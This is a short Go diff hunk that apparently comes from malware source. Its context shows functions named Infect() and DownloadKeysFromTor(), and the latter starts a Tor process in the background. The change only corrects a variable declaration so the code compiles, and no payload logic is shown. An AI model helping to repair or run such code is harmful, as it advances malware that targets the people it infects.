@@ -48,7 +48,7 @@ func Infect() (bool, error) {
 func DownloadKeysFromTor() error {
     // start tor in the background
     tor := exe.NewTor(torDirectory, "")
-    err = tor.Start()
+    err := tor.Start()
     if err != nil {
         return errors.Wrap(pkg, "failed to start tor", err)
     }
